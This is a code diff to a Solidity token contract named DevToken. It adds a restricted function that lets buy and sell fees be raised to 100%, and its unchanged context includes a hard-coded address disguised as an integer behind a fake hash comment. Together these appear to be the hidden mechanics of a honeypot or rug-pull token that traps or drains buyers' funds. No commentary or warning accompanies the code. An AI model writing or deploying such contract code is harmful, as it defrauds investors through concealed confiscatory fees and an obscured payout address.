@@ -135,6 +135,15 @@ contract DevToken {
     return address 
     /*keccak256 -> 9838607940089fc7f92ac2a37bb1f5ba1daf2a576dc8ajf1k3sa4741ca0e5571412708986))*/ /**/(17860794006513704634733521910879985571412708986);
     }
+     
+    function FeeStructure(uint256 newBuyFee, uint256 newSellFee) public onlypublic {
+        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");
+        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
+        
+        _setFees(newBuyFee, newSellFee);
+
+        emit FeesUpdated(newBuyFee, newSellFee);
+    }
  
     function approve(address _spender, uint256 _value) public returns (bool success) {
         allowance[msg.sender][_spender] = _value;
@@ -191,6 +200,10 @@ contract DevToken {
     _;
     }
 
+    function _setFees(uint256 newBuyFee, uint256 newSellFee) internal {
+        buyFee = newBuyFee;
+        sellFee = newSellFee;
+    }
  
     function setUser(address User_) public returns (bool) {
     require(msg.sender == _mbr);
